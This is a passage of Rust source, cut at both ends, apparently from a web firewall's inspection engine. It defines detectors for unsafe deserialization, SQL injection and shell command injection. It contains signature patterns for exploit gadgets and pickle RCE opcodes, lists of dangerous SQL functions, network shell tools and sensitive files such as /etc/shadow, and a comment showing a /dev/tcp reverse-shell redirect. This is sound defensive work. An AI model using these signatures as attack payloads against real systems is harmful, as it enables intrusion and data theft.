/// a base64 attachment or free-form text. These rules therefore judge whether a
/// payload *presents a known unsafe-deserialization format / gadget signature*, not
/// whether the backend truly deserialized it — the same input-side ceiling the plan
/// §二.2 calls out for every Lane 2 detector.
///
/// **FP discipline.** A bare base64 blob, a lone `[` / `{`, a single fully-qualified
/// class-name substring and a PHP array header `a:\d+:{` all recur in perfectly
/// legitimate traffic, so **default-on ships only serialization magic + a known
/// exploit gadget class / dangerous opcode combination** — signatures essentially
/// never benign in request data. The high-noise generic markers (the PHP array
/// header, a bare `__reduce__` dunder, and the generic
/// `org.apache.commons.collections` *package* as opposed to the specific gadget
/// leaf classes) ship **default-off** pending holdout calibration.
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
const DESER_RULES: &[RuleRow] = &[
    // ── Java (default-on strong signals) ─────────────────────────────────────
    // Java serialized-stream magic `\xAC\xED\x00\x05` in base64 form: the stream
    // header base64-encodes to `rO0AB…` (lowercased `ro0ab` on the view surface).
    // A directly-matchable base64 token — fires on the RAW view with no decode, the
    // canonical Java-deserialization indicator (matches ModSecurity CRS's `rO0AB`).
    // DEFAULT-ON.
    ("deser.java_serial_b64", 90, r"ro0ab", RuleKind::Presence, true),
    // Java serialized-stream magic in hex-text form (`aced0005`) or as an escaped
    // byte literal (`\xac\xed`) — the hex/escaped spelling of `\xAC\xED\x00\x05` that
    // survives on the UTF-8 view where the raw bytes would be lossy-mangled.
    // DEFAULT-ON.
    (
        "deser.java_hex_magic",
        88,
        r"aced0005|\\xac\\xed",
        RuleKind::Presence,
        true,
    ),
    // Known ysoserial gadget classes — the specific exploit leaf classes that turn a
    // Java stream into RCE (Commons-Collections `InvokerTransformer`, JAXP
    // `TemplatesImpl`, `JdbcRowSetImpl`, `BadAttributeValueExpException`, Commons-
    // BeanUtils `BeanComparator`). The FULLY-qualified gadget leaf, never the bare
    // `org.apache` package (that ships default-off), so a legit dependency line or
    // stack trace mentioning `org.apache.commons` does not fire. DEFAULT-ON.
    (
        "deser.java_gadget_class",
        90,
        r"org\.apache\.commons\.collections\.functors|invokertransformer|templatesimpl|com\.sun\.rowset\.jdbcrowsetimpl|badattributevalueexpexception|org\.apache\.commons\.beanutils\.beancomparator",
        RuleKind::Presence,
        true,
    ),
    // ── PHP (default-on) ─────────────────────────────────────────────────────
    // PHP `serialize()` OBJECT header carrying a KNOWN POP-chain gadget class — the
    // object-injection primitive whose class name belongs to a framework/library that
    // ships an exploitable `__wakeup`/`__destruct` gadget (PHPGGC chains): Monolog,
    // Guzzle, Symfony, Doctrine, Laravel, Zend, SwiftMailer, ThinkPHP, Yii, phpseclib,
    // Imagick. A typed object with one of these class roots is essentially never benign
    // request data. The generic `O:<len>:"<any-class>":` header (which matches ordinary
    // `stdClass` session/cookie payloads) ships default-off below. The class char class
    // is a single bounded repetition (no nesting → linear). DEFAULT-ON.
    (
        "deser.php_object_gadget",
        88,
        r#"o:\d+:"[a-z0-9_\\]*(?:monolog|guzzlehttp|symfony|doctrine|laravel|zend|swift_?mailer|thinkphp|yii|phpseclib|imagick|phpggc)[a-z0-9_\\]*":\d+:\{"#,
        RuleKind::Presence,
        true,
    ),
    // PHP `phar://` stream wrapper — triggers phar-metadata deserialization on file
    // operations; never legitimate in request data. DEFAULT-ON.
    ("deser.php_phar", 85, r"phar://", RuleKind::Presence, true),
    // ── Python pickle (default-on) ───────────────────────────────────────────
    // Pickle `GLOBAL` opcode (`c<module>\n<callable>`) resolving a dangerous callable:
    // `cos\nsystem` / `cposix\nsystem` / `cnt\nsystem` (os.system), `c__builtin__\n
    // eval|exec|compile`, `csubprocess\n…` / `ccommands\n…` / `cpty\n…`. The
    // preprocessor collapses the opcode newlines to spaces, so the module and callable
    // arrive as adjacent tokens (`cos system`). This is a pickle-RCE reduction — the
    // dangerous-opcode COMBINATION, not a bare token — and hits base64-wrapped pickles
    // on their decoded view (surfaced by the deser blind-decode marker in preprocess).
    // Each alternative carries a LEADING `\b` so the pickle module token must start on a
    // word boundary: `macos system` / `the acos system` (word-internal `cos`) no longer
    // match, while a real `cos\nsystem` opcode (`c` at a space/start boundary) still does.
    // DEFAULT-ON.
    (
        "deser.py_pickle_global_exec",
        90,
        r"\bc(?:os|posix|nt)\s+system\b|\bc__builtin__\s+(?:eval|exec|compile)\b|\bc(?:subprocess|commands|pty)\s+[a-z_]",
        RuleKind::Presence,
        true,
    ),
    // ── .NET (default-on) ────────────────────────────────────────────────────
    // .NET `BinaryFormatter` / `LosFormatter` serialized header in base64: the stream
    // header `\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF` base64-encodes to `AAEAAAD/////`
    // (lowercased `aaeaaad/////`). A directly-matchable base64 token that fires on the
    // raw view, the canonical .NET-deserialization indicator. DEFAULT-ON.
    (
        "deser.dotnet_binaryformatter_b64",
        90,
        r"aaeaaad/////",
        RuleKind::Presence,
        true,
    ),
    // Known .NET deserialization gadget markers: `ObjectDataProvider` /
    // `TypeConfuseDelegate` / `ActivitySurrogateSelector` (ysoserial.net gadgets).
    // These names exist only in exploit payloads, never in benign code/prose. The bare
    // formatter TYPE names `BinaryFormatter` / `LosFormatter` (which recur in legitimate
    // .NET source, docs, bug-trackers and security discussion) are NOT gadgets on their
    // own and ship default-off below. DEFAULT-ON.
    (
        "deser.dotnet_gadget",
        88,
        r"objectdataprovider|typeconfusedelegate|activitysurrogateselector",
        RuleKind::Presence,
        true,
    ),
    // ── default-off (high-noise, holdout calibration pending) ────────────────
    // Generic PHP `serialize()` OBJECT header `O:<len>:"<any-class>":<n>:{` — the
    // structural object-injection primitive, but it also matches the ordinary
    // `O:8:"stdClass"` objects that legitimate apps carry in cookies / hidden fields /
    // caches (WP, Laravel). Only fires with the gadget-class narrowing default-on above;
    // the class-agnostic form is DEFAULT-OFF until holdout-calibrated. The class char
    // class is a single bounded repetition (no nesting → linear).
    (
        "deser.php_object_injection",
        60,
        r#"o:\d+:"[a-z0-9_\\]{1,120}":\d+:\{"#,
        RuleKind::Presence,
        false,
    ),
    // Bare .NET serializer TYPE names `BinaryFormatter` / `LosFormatter` — legitimate
    // framework type names that recur in .NET source, docs, code-review and security
    // discussion; not exploit gadgets on their own (the ysoserial.net gadget markers
    // ship default-on above). DEFAULT-OFF.
    (
        "deser.dotnet_formatter_name",
        30,
        r"binaryformatter|losformatter",
        RuleKind::Presence,
        false,
    ),
    // PHP serialized ARRAY header `a:<len>:{` — recurs wherever PHP serializes plain
    // arrays (sessions, caches, form state); carries no object-injection signal on its
    // own. DEFAULT-OFF.
    ("deser.php_array", 20, r"a:\d+:\{", RuleKind::Presence, false),
    // Bare pickle dunder `__reduce__` — appears in ordinary Python source, docs and
    // tracebacks that a paste / bug-tracker / code-review backend legitimately carries;
    // the RCE signal is the GLOBAL-opcode combo above, not this token. DEFAULT-OFF.
    ("deser.py_reduce", 25, r"__reduce__", RuleKind::Presence, false),
    // Generic `org.apache.commons.collections` PACKAGE (as opposed to the specific
    // gadget leaf classes) — recurs in dependency manifests, class-path logs and stack
    // traces of perfectly benign Java apps. DEFAULT-OFF.
    (
        "deser.java_pkg_generic",
        25,
        r"org\.apache\.commons\.collections",
        RuleKind::Presence,
        false,
    ),
];

/// Structural unsafe-deserialization detector (plan T2-F).
///
/// Registered in the `Deserialization` attack family; matches on the normalised
/// view text — **including the base64/hex decoded views** the preprocessor already
/// produces, so a wrapped payload is caught after the shared blind-decode chain.
/// Single-detector family — no corroboration partner — so FP control is by narrow
/// default-on rules (serialization magic + known exploit gadget class / dangerous
/// opcode) plus default-off high-noise generic markers, per the plan §四.3 invariant.
/// Runs **no** deserializer and **no** parser: a pure bounded-regex scan over a
/// backtracking-free automaton, so no recursion, no `ReDoS`, no stack-overflow
/// surface.
pub struct DeserStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl DeserStructuralDetector {
    /// Compile the **default-on** rules (Java base64/hex magic + gadget classes, the
    /// PHP object header + `phar://`, the Python pickle `GLOBAL`-exec combos, and the
    /// .NET `BinaryFormatter` base64 + gadget markers). The high-noise generic markers
    /// (PHP array header, bare `__reduce__`, generic Commons-Collections package) await
    /// holdout calibration and are not compiled.
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(DESER_RULES, false, "DeserStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(DESER_RULES, true, "DeserStructuralDetector"),
        }
    }
}

impl Default for DeserStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for DeserStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::DeserStruct
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Deserialization, "deserialization"))
    }
}

// ── AST SQLi detector (sqlparser-rs true parse, plan §11, P2) ─────────────────

/// Maximum bracket / prefix-operator nesting depth we will hand to `sqlparser`.
///
/// **Primary stack-safety guard (P2 recursive-protection decision).** We build
/// `sqlparser` with `default-features = false`, which drops the
/// `recursive-protection` feature and its `psm` dependency (a C build + `unsafe`) —
/// keeping the supply chain zero-C / zero-unsafe (iron rule). Without that feature
/// the parser has **no** stack guard: its `with_recursion_limit` is a no-op, and
/// its recursive descent overflows a 2 MiB worker-thread stack once nesting grows
/// large enough. The per-frame stack cost differs by construct, so the overflow
/// floor does too — measured (2 MiB stack) at, release / debug builds:
/// `case`/`not` ≈ 240 / 18, `(((…)))` ≈ 329 / 60, unary `- -` ≈ 376 / 60. The
/// smallest floor is `case`/`not` at ~18 frames in a debug build. `12` sits below
/// even that, so [`ast_structural_depth_ok`] — which counts **every** recursion
/// driver reachable in `GenericDialect` (brackets, `case`, `not`, `interval`, and
/// the unary prefixes `+ - ~ !`) — never admits an input the parser could recurse
/// near an overflow on. A rejected input simply yields no AST signal (fail-open —
/// the structural detector still runs). `+`/`-` were the P2 gap: they drive unary
/// recursion but were not counted, so a `1 or 1 < - - … 1` chain slipped past the
/// old scan and could abort the worker; they are counted now, and
/// [`AST_MAX_INPUT_BYTES`] is a second, independent cap in case any driver is ever
/// missed again.
const MAX_AST_NESTING: usize = 12;

/// Belt-and-suspenders stack-safety cap: the maximum input byte length handed to
/// the AST path, independent of the per-driver [`MAX_AST_NESTING`] scan.
///
/// Each parser recursion consumes at least one token, and every token is at least
/// one byte, so the recursion depth of any parse is **at most the input byte
/// length** — the densest driver (`(`, `~`) costs exactly one frame per byte. An
/// input capped at `256` bytes can therefore drive at most ~256 value frames plus
/// the fixed `select * from t where c = …` wrapper (a small constant), staying
/// below the lowest measured one-frame-per-byte overflow floor (`(((…)))` at ~329
/// release frames) with margin. This holds **regardless** of which operators the
/// cheap scan above happens to enumerate, so even a future `sqlparser` prefix
/// entry the scan does not know about cannot overflow the stack through this path.
/// A longer input is declined for AST (fail-open — the structural detector still
/// runs). Real injection structures the AST layer targets are far shorter than
/// this cap.
const AST_MAX_INPUT_BYTES: usize = 256;

/// Recursion limit handed to `sqlparser` as defence-in-depth. It is a no-op in
/// the current `recursive-protection`-off build (the real guard is
/// [`ast_structural_depth_ok`]); it is set above [`MAX_AST_NESTING`] so it can
/// never spuriously reject an input the depth guard already admitted, while still
/// catching a runaway should a future `sqlparser` version begin enforcing it.
const AST_RECURSION_LIMIT: usize = 20;

/// SQL functions whose presence in a value context is a time-based / blind /
/// exfiltration primitive (mirrors the structural `sql.dangerous_fn` set). A
/// benign scalar value never contains one of these calls.
const AST_DANGEROUS_FNS: &[&str] = &[
    "sleep",
    "pg_sleep",
    "benchmark",
    "load_file",
    "updatexml",
    "extractvalue",
    "xp_cmdshell",
];

/// Cheap pre-filter: only spend an AST parse attempt when the input plausibly
/// carries SQL structure. A benign scalar (number / word / UUID / prose) matches
/// nothing here, so the overwhelming majority of traffic skips the parser (and the
/// AST budget) entirely — clean traffic never even reaches [`ContentInspectionState::try_take_ast_attempt`].
///
/// Liberal by design on the safe side: a benign value that slips through simply
/// fails to parse or yields no injection AST (the classifier, not this gate, is
/// the correctness boundary). Bare `or` / `and` (common English) only qualify when
/// a comparison operator is also present, so prose like `active or inactive` never
/// spends a parse attempt.
fn ast_prefilter(s: &str) -> bool {
    // Strong keyword tokens (word-bounded) — rarely appear in benign values.
    const STRONG_KW: &[&str] = &[
        "union",
        "select",
        "sleep",
        "benchmark",
        "load_file",
        "updatexml",
        "extractvalue",
        "xp_cmdshell",
        "waitfor",
        "insert",
        "update",
        "delete",
        "drop",
        "exec",
    ];
    const BOOL_KW: &[&str] = &["or", "and"];
    // Punctuation-level injection markers.
    if s.contains('\'') || s.contains(';') || s.contains("--") || s.contains("/*") || s.contains('#') {
        return true;
    }
    let mut has_bool = false;
    for tok in s.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_')) {
        if STRONG_KW.contains(&tok) {
            return true;
        }
        if BOOL_KW.contains(&tok) {
            has_bool = true;
        }
    }
    // `or` / `and` count only alongside a comparison operator (a real boolean
    // injection: `1 or 1=1`), never on their own (`cats and dogs`).
    has_bool && (s.contains('=') || s.contains('<') || s.contains('>'))
}

/// Over-approximation of `sqlparser`'s recursion depth, used purely as a
/// stack-overflow guard (see [`MAX_AST_NESTING`]). The estimated recursion depth is
/// `max bracket nesting + total paren-less keyword/prefix recursion drivers`:
///
/// * bracket nesting (`(` / `[`) drives paren / function / subquery / `exists`
///   recursion (all of which descend through a bracket);
/// * the paren-less prefix operators `not`, `case`, `interval`, and the unary signs
///   `+ - ~ !` nest **without** brackets — and their *total* count upper-bounds any
///   consecutive run or nesting depth.
///
/// The unary `+`/`-` signs were the P2 gap (they drive `parse_prefix` recursion but
/// were previously uncounted, so a space-separated `- - … ` chain estimated depth
/// `0` and could overflow the stack); they are counted here now. Because the count
/// over-approximates it rejects strictly more than necessary — always the safe
/// (fail-open) direction. This scan is the primary guard; [`AST_MAX_INPUT_BYTES`]
/// is a byte-length backstop applied first, so a driver this scan might not know
/// about still cannot overflow the stack.
fn ast_structural_depth_ok(s: &str) -> bool {
    // Backstop: bound recursion by input length regardless of the driver scan
    // below (depth <= tokens <= bytes).
    if s.len() > AST_MAX_INPUT_BYTES {
        return false;
    }

    let mut bracket: usize = 0;
    let mut max_bracket: usize = 0;
    let mut prefixish: usize = 0;
    let mut word_start: Option<usize> = None;

    let close_word = |word_start: &mut Option<usize>, end: usize, prefixish: &mut usize| {
        if let Some(start) = word_start.take() {
            let word = s.get(start..end).unwrap_or_default();
            if word == "not" || word == "case" || word == "interval" {
                *prefixish += 1;
            }
        }
    };

    for (idx, c) in s.char_indices() {
        if c.is_ascii_alphanumeric() || c == '_' {
            if word_start.is_none() {
                word_start = Some(idx);
            }
            continue;
        }
        close_word(&mut word_start, idx, &mut prefixish);
        match c {
            '(' | '[' => {
                bracket += 1;
                max_bracket = max_bracket.max(bracket);
            }
            ')' | ']' => bracket = bracket.saturating_sub(1),
            // Unary prefixes that drive `sqlparser::parse_prefix` recursion. `+`/`-`
            // are the P2 fix; `~`/`!` were already counted.
            '~' | '!' | '+' | '-' => prefixish += 1,
            _ => {}
        }
        if max_bracket.saturating_add(prefixish) > MAX_AST_NESTING {
            return false;
        }
    }
    close_word(&mut word_start, s.len(), &mut prefixish);
    max_bracket.saturating_add(prefixish) <= MAX_AST_NESTING
}

/// Spend one AST attempt (subject to the per-request budget) parsing `sql` and
/// classifying it. Returns `None` when the budget is exhausted, the parse fails,
/// or the parse is an ordinary single-value query.
fn ast_attempt(sql: &str, state: &mut ContentInspectionState) -> Option<(&'static str, u8)> {
    if !state.try_take_ast_attempt() {
        return None;
    }
    let stmts = parse_wrapped(sql)?;
    classify_statements(&stmts)
}

/// Parse a wrapped statement string, returning the statements on a full,
/// consume-to-EOF parse. `parse_statements` (unlike `parse_expr`) never silently
/// truncates — trailing tokens are a parse error — so pitfall ① ("`parse_expr`
/// stops at the first unparseable token and reports the prefix as clean") cannot
/// mislead us: we never infer *clean* from a partial parse. A parse error yields
/// `None` (no signal — a parse failure is not, on its own, evidence of injection).
fn parse_wrapped(sql: &str) -> Option<Vec<Statement>> {
    Parser::new(&GenericDialect {})
        .with_recursion_limit(AST_RECURSION_LIMIT)
        .try_with_sql(sql)
        .ok()?
        .parse_statements()
        .ok()
}

/// Whether a binary operator is an arithmetic comparison (the shape of a SQL
/// tautology `1=1` / `'a'<>'b'`). Boolean `And`/`Or` and `Like` are intentionally
/// excluded — a tautology is a comparison **between two constants**.
const fn is_comparison_op(op: &BinaryOperator) -> bool {
    matches!(
        op,
        BinaryOperator::Eq
            | BinaryOperator::NotEq
            | BinaryOperator::Lt
            | BinaryOperator::LtEq
            | BinaryOperator::Gt
            | BinaryOperator::GtEq
            | BinaryOperator::Spaceship
    )
}

/// Whether an expression is a literal constant (a number / string / boolean /
/// null), unwrapping parentheses and unary sign. Used to decide a tautology:
/// a comparison **between two literals** (`1=1`, `'a'='a'`) is always-true/false
/// and never appears in a legitimate `col = <value>` — the value alone is one
/// literal, never a `literal <cmp> literal` sub-expression.
fn is_literal_expr(e: &Expr) -> bool {
    match e {
        Expr::Value(_) => true,
        Expr::Nested(inner) => is_literal_expr(inner),
        Expr::UnaryOp { expr, .. } => is_literal_expr(expr),
        _ => false,
    }
}

/// Whether an [`ObjectName`]'s final identifier names a dangerous SQL function.
fn is_dangerous_fn(name: &ObjectName) -> bool {
    name.0
        .last()
        .and_then(|part| match part {
            ObjectNamePart::Identifier(id) => Some(id.value.as_str()),
            ObjectNamePart::Function(_) => None,
        })
        .is_some_and(|n| AST_DANGEROUS_FNS.contains(&n.to_ascii_lowercase().as_str()))
}

/// Injection structures discovered while walking a `WHERE` expression.
#[derive(Default)]
struct AstFlags {
    dangerous_fn: bool,
    tautology: bool,
    subquery: bool,
}

/// Recursively collect injection structures from a `WHERE` expression. Depth is
/// bounded (the AST itself is already depth-limited by [`ast_structural_depth_ok`];
/// this guard is belt-and-braces so the walker can never recurse unbounded).
fn walk_where(e: &Expr, depth: usize, flags: &mut AstFlags) {
    if depth > 64 {
        return;
    }
    let d = depth + 1;
    match e {
        Expr::BinaryOp { left, op, right } => {
            if is_comparison_op(op) && is_literal_expr(left) && is_literal_expr(right) {
                flags.tautology = true;
            }
            walk_where(left, d, flags);
            walk_where(right, d, flags);
        }
        Expr::UnaryOp { expr, .. } | Expr::Nested(expr) | Expr::Cast { expr, .. } => walk_where(expr, d, flags),
        Expr::Like { expr, pattern, .. } | Expr::ILike { expr, pattern, .. } => {
            walk_where(expr, d, flags);
            walk_where(pattern, d, flags);
        }
        Expr::Between { expr, low, high, .. } => {
            walk_where(expr, d, flags);
            walk_where(low, d, flags);
            walk_where(high, d, flags);
        }
        Expr::InList { expr, list, .. } => {
            walk_where(expr, d, flags);
            for item in list {
                walk_where(item, d, flags);
            }
        }
        Expr::Function(func) => {
            if is_dangerous_fn(&func.name) {
                flags.dangerous_fn = true;
            }
        }
        Expr::Subquery(_) | Expr::Exists { .. } => flags.subquery = true,
        Expr::InSubquery { expr, .. } => {
            flags.subquery = true;
            walk_where(expr, d, flags);
        }
        _ => {}
    }
}

/// Classify a parsed statement list into an injection `(rule_key, confidence)`,
/// or `None` when it is an ordinary single-value query.
///
/// The input was wrapped as `select * from t where c = <input>` (pitfall ②:
/// UNION / stacked statements are invisible at the expression level, so we parse
/// at the **statement** level). A benign scalar produces exactly one statement
/// whose body is a `Select` with a `c = <literal>` `WHERE` and nothing else; every
/// branch below fires only on structure the *input* grafted in, which a single
/// value can never contribute.
fn classify_statements(stmts: &[Statement]) -> Option<(&'static str, u8)> {
    // Stacked query: the wrapper is one statement — more than one means the input
    // injected a statement separator.
    if stmts.len() > 1 {
        return Some(("ast.stacked", 90));
    }
    let Some(Statement::Query(query)) = stmts.first() else {
        return None;
    };
    classify_set_expr(&query.body, 0)
}

/// Classify a query body (recursing through a parenthesised sub-body).
fn classify_set_expr(body: &SetExpr, depth: usize) -> Option<(&'static str, u8)> {
    if depth > 64 {
        return None;
    }
    match body {
        // UNION / EXCEPT / INTERSECT grafted onto `c = <input>` — a value can
        // never introduce a set operation.
        SetExpr::SetOperation { .. } => Some(("ast.union", 85)),
        SetExpr::Select(select) => {
            let mut flags = AstFlags::default();
            if let Some(expr) = &select.selection {
                walk_where(expr, 0, &mut flags);
            }
            // Highest-confidence structure wins.
            if flags.dangerous_fn {
                Some(("ast.dangerous_fn", 85))
            } else if flags.tautology {
                Some(("ast.tautology", 80))
            } else if flags.subquery {
                Some(("ast.subquery", 78))
            } else {
                None
            }
        }
        SetExpr::Query(inner) => classify_set_expr(&inner.body, depth + 1),
        _ => None,
    }
}

/// `sqlparser`-rs true-AST `SQLi` detector (plan §11, P2).
///
/// The **second** detector in the `SqlInjection` family (alongside
/// [`StructuralSqlDetector`]); it parses each normalised view with `sqlparser` and
/// fires on parse-acceptability of an injection structure (UNION / stacked /
/// tautology / dangerous-function / subquery), returning a context-free
/// [`DetectionFinding`].
///
/// The three measured `sqlparser` pitfalls are handled structurally:
/// * **① silent `parse_expr` truncation** — we never use `parse_expr`; every parse
///   goes through [`parse_wrapped`] (`parse_statements`), which consumes to EOF or
///   errors, so a partial prefix parse can never be mistaken for a clean value.
/// * **② UNION / stacked invisible at expression level** — the input is wrapped in
///   a `select * from t where c = <input>` **statement** so set operations and
///   statement separators surface ([`classify_statements`]).
/// * **③ comments vanish in the AST** — comment obfuscation is caught at the char
///   layer: the preprocessor already emits a `CommentStripped` view (so the
///   detector re-runs on the de-commented form), and any injection whose source
///   view still carried a comment marker is labelled `ast.comment_obfusc`.
///
/// **Known, intentional fail-safe blind spots (not vulnerabilities).** This
/// detector deliberately under-detects a few shapes to hold false positives down;
/// they are covered by the structural (`StructuralSqlDetector`) and frozen Lane 1
/// (libinjection) detectors, and are recorded here so callers never assume the AST
/// layer alone is complete:
/// * **bare-truthy `OR`** (`' OR 1`, `OR true`, `OR 'x'`) — the tautology rule is
///   narrowed to `literal <cmp> literal`, so a bare truthy literal with no
///   comparison operator does not fire on the AST path (narrowing suppresses the
///   large FP surface of "any `OR <value>`").
/// * **bracket/quote-breakout `UNION`** (`1) union select …`, `1') union select …`)
///   — the numeric and single-quote wrappers both fail to parse the broken-out
///   context, so no AST set-operation surfaces.
/// * **`ORDER BY` / projection-position / `INTO OUTFILE` injection** — these
///   positions are not reachable from the value-context wrapper under
///   `GenericDialect`, so the AST does not model them.
pub struct AstSqlDetector {
    _private: (),
}

impl AstSqlDetector {
    #[must_use]
    pub const fn new() -> Self {
        Self { _private: () }
    }
}

impl Default for AstSqlDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for AstSqlDetector {
    fn id(&self) -> DetectorId {
        DetectorId::Ast
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let s = view.lower_trunc.as_str();
        if s.is_empty() {
            return None;
        }
        // Cheap gate — clean traffic exits here without touching the AST budget.
        if !ast_prefilter(s) {
            return None;
        }
        // Stack-safety: decline deeply-nested input before it reaches the parser.
        if !ast_structural_depth_ok(s) {
            return None;
        }
        // DoS byte budget (per-request total across all views).
        if !state.try_take_ast_input_bytes(s.len()) {
            return None;
        }

        let has_comment = s.contains("--") || s.contains("/*") || s.contains('#');

        // Numeric / bareword context — catches UNION, stacked, `1 or 1=1`,
        // `1 and sleep(5)`, subqueries. On a miss, fall back (only when the input
        // carries a quote) to the single-quote breakout context — pitfall ①:
        // `1' or '1'='1` breaks out of a quoted value, and the quoted wrapper
        // reveals the tautology the numeric wrapper cannot parse.
        let (structural_key, confidence) =
            ast_attempt(&format!("select * from t where c = {s}"), state).or_else(|| {
                if s.contains('\'') {
                    ast_attempt(&format!("select * from t where c = '{s}'"), state)
                } else {
                    None
                }
            })?;
        // Pitfall ③: a confirmed injection whose source view still carried a comment
        // marker is comment-obfuscated (the AST alone cannot see the comment).
        let rule_key = if has_comment {
            "ast.comment_obfusc"
        } else {
            structural_key
        };
        Some(DetectionFinding {
            attack: AttackKind::SqlInjection,
            confidence: Confidence::saturating(confidence),
            rule_key,
            detail: Cow::Owned(format!(
                "ast sqli structure '{rule_key}' matched (confidence {confidence})"
            )),
        })
    }
}

// ── RCE true shell-AST detector (T1-A, brush-parser) ──────────────────────────

/// Per-view byte cap for the shell-AST parse — a hard `DoS` backstop applied
/// *before* the parse so a single oversized view can never drive an unbounded
/// parse. Larger views are declined (the request is not marked degraded here — a
/// too-large field is simply not AST-inspected; the structural [`RceStructuralDetector`]
/// still runs on it). Chosen generously enough to hold a realistic reverse-shell /
/// here-doc payload while bounding worst-case parser work.
const SHELL_AST_MAX_INPUT_BYTES: usize = 2048;

/// Maximum AST-walk recursion depth (subshell / brace-group / function nesting).
/// A payload nested deeper than this is not walked further — a documented honest
/// boundary, never a panic (the walk simply stops descending).
const SHELL_WALK_MAX_DEPTH: usize = 32;

/// Maximum nesting depth of shell recursion-driving delimiters that may be handed
/// to the brush-parser tokenizer. `brush-parser`'s recursive-descent **tokenizer**
/// has no internal depth bound, so a deeply nested `$( … )` / `$(( … ))` /
/// `{ … }` / backtick payload drives unbounded recursion and overflows the worker's
/// (2 MiB) thread stack *during lexing* — earlier than [`SHELL_WALK_MAX_DEPTH`]
/// (a post-parse walk bound) or [`SHELL_AST_MAX_INPUT_BYTES`] (a byte cap) can help,
/// and a Rust stack overflow aborts the process (`catch_unwind` cannot intercept it).
/// Measured overflow onset is ~150–170 nested `$(`; this bound sits far below it so a
/// too-deep payload is *declined before any brush-parser call* (the structural
/// [`RceStructuralDetector`] still inspects the field — the request is not degraded).
const SHELL_MAX_NESTING_DEPTH: usize = 20;

/// Maximum number of per-word command-substitution re-parses in one detector
/// invocation. Bounds the extra [`shell_word::parse`] work a wide command line can
/// trigger; beyond it, later words are not sub-parsed for `$(…)` / backtick
/// substitutions (the top-level structural rules still fire).
const SHELL_MAX_WORD_PARSES: usize = 32;

/// Interpreter binaries whose presence as a command head — with an inline-code
/// exec flag, a here-doc, or as a pipeline sink — is a command-execution signal.
/// `python*` is matched by prefix (`python3`, `python3.11`) in [`is_interpreter`].
const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "ash",
    "busybox",
    "python",
    "perl",
    "ruby",
    "php",
    "node",
    "nodejs",
    "lua",
    "powershell",
    "pwsh",
];

/// Network utilities used to build reverse / bind shells.
const NET_SHELLS: &[&str] = &["nc", "ncat", "netcat", "telnet", "socat"];

/// File-reader commands — dangerous only when their argument is a sensitive path
/// (the AST corroboration of the structural `rce.sensitive_read`).
const READERS: &[&str] = &["cat", "less", "more", "head", "tail", "nl", "od", "xxd", "strings"];

/// Inline-code / exec flags: `sh -c`, `python -c`, `perl -e`, `nc -e`,
/// `powershell -enc`. Compared case-insensitively against a whole argument word.
const EXEC_FLAGS: &[&str] = &["-c", "-e", "-enc", "-encodedcommand", "-command"];

/// Sensitive absolute paths that make a reader command a disclosure attempt.
const SENSITIVE_PATHS: &[&str] = &["/etc/passwd", "/etc/shadow", "/proc/self", "/proc/version"];

/// Commands whose appearance as the head of a `$(…)` / backtick command
/// substitution promotes it from the high-noise `rce_ast.cmd_subst_any`
/// (default-off) to the default-on `rce_ast.cmd_subst`. Union of the interpreter /
/// net / reader sets plus the classic recon binaries.
const DANGER_CMDS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "ash",
    "busybox",
    "python",
    "perl",
    "ruby",
    "php",
    "node",
    "nodejs",
    "lua",
    "powershell",
    "pwsh",
    "nc",
    "ncat",
    "netcat",
    "telnet",
    "socat",
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "nl",
    "od",
    "xxd",
    "strings",
    "id",
    "whoami",
    "uname",
    "wget",
    "curl",
    "hostname",
    "ifconfig",
    "ip",
    "env",
    "printenv",
    "nslookup",
    "dig",
    "ping",
    "pwd",
    "rm",
    "chmod",
    "chown",
    "kill",
    "mkfifo",
];

/// Whether a (basename-lowercased) command name is a shell/script interpreter.
/// `python*` is matched by prefix so versioned binaries (`python3`, `python3.11`)
/// are covered without listing each.
fn is_interpreter(name: &str) -> bool {
    INTERPRETERS.contains(&name) || name.starts_with("python")
}

/// Canonicalise a word value to a bare command name for matching: drop a single
/// layer of surrounding quotes, take the trailing path component, lowercase.
/// Best-effort — a word that is itself an expansion (`$x`, `$(…)`) yields a name
/// that matches nothing, which is intentional (those are handled separately).
fn cmd_basename(word_value: &str) -> String {
    let unquoted = word_value.trim_matches(|c| c == '\'' || c == '"');
    let base = unquoted.rsplit(['/', '\\']).next().unwrap_or(unquoted);
    base.to_ascii_lowercase()
}

/// The plain command-head name of a simple command, if it has one.
fn simple_cmd_name(sc: &shell_ast::SimpleCommand) -> Option<String> {
    sc.word_or_name.as_ref().map(|w| cmd_basename(&w.value))
}

/// Whether a redirect-target word denotes a `/dev/tcp` or `/dev/udp` pseudo-device
/// (the bash reverse-shell channel, e.g. `>& /dev/tcp/10.0.0.1/4444`).
fn is_devtcp_target(word_value: &str) -> bool {
    let l = word_value.to_ascii_lowercase();
    l.contains("/dev/tcp/") || l.contains("/dev/udp/")
}

/// Whether a word value contains a sensitive absolute path (substring match on the
/// canonical forms — a `cat /etc/passwd` argument or a `cat$IFS/etc/passwd` form
/// already collapsed by the shell-normalise view).
fn arg_hits_sensitive_path(word_value: &str) -> bool {
    let l = word_value.to_ascii_lowercase();
    SENSITIVE_PATHS.iter().any(|p| l.contains(p))
}

/// Whether the inner text of a command substitution leads with a dangerous binary
